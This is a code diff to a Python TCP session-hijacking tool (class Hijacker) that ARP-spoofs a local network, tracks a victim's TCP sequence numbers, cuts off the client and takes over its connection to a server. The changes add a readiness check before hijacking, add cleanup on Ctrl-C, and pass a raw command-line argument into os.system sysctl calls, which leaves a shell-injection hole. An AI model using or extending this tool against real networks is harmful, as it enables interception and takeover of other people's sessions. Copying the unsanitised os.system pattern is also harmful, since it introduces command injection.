@@ -113,6 +113,7 @@ class Hijacker:
         self.client_port = 0
         self.seq_nr = 0
         self.ack_nr = 0
+        self.hijacking_possible = False
         self.hijacked = False
         self.current_time = 0
         self.arp_interval_ns = 10 ** 9
@@ -253,6 +254,8 @@ class Hijacker:
         if self.__from_client(ip_pk, tcp_seg):
             self.seq_nr = tcp_seg.seq_nr
             self.ack_nr = tcp_seg.ack_nr
+            if not self.hijacking_possible:
+                self.hijacking_possible = True
         if not self.hijacked:
             self.__print_segment(tcp_seg)
         return True
@@ -282,6 +285,9 @@ class Hijacker:
     def __process_input(self, key:chr):
         if not self.hijacked:
             if key in ('h', 'H'):
+                if not self.hijacking_possible:
+                    tools.print_rgb('Not enough data!', rgb=self.RED, bold=True)
+                    return
                 self.cut_off_client()
                 self.tcp_handler = tcp.TCPHandler(self.interface,
                         self.client_port, self.server.ip_addr, block=0)
@@ -343,13 +349,18 @@ class Hijacker:
     def run(self):
         self.term_handler.set_cbreak()
         self.__intro()
-        while self.term_handler.last_key != chr(4):
-            self.__spoof()
-            self.__process_frame(self.__next_frame())
-            self.__process_input(self.term_handler.get_key())
-            self.__receive_data()
-        self.__tear_down()
-        tools.print_rgb('\nTerminated\n', self.ORANGE, bold=True)
+        try:
+            while self.term_handler.last_key != chr(4):
+                self.__spoof()
+                self.__process_frame(self.__next_frame())
+                self.__process_input(self.term_handler.get_key())
+                self.__receive_data()
+            tools.print_rgb('\nCtrl-D...', self.ORANGE, bold=True, end='')
+        except KeyboardInterrupt:
+            tools.print_rgb('\nCtrl-C...', self.ORANGE, bold=True, end='')
+        finally:
+            self.__tear_down()
+            tools.print_rgb('\nTerminated\n', self.ORANGE, bold=True)
 
 
 if __name__ == '__main__':
@@ -379,8 +390,7 @@ if __name__ == '__main__':
             sys.exit(1)
 
     check_args()
-    if_name = sys.argv[1]
-    os.system(f'sysctl -w net.ipv4.conf.{if_name}.forwarding=0')
-    os.system(f'sysctl -w net.ipv4.conf.{if_name}.send_redirects=0')
+    os.system(f'sysctl -w net.ipv4.conf.{sys.argv[1]}.forwarding=0')
+    os.system(f'sysctl -w net.ipv4.conf.{sys.argv[1]}.send_redirects=0')
     hijacker = Hijacker(sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4]))
     hijacker.run()
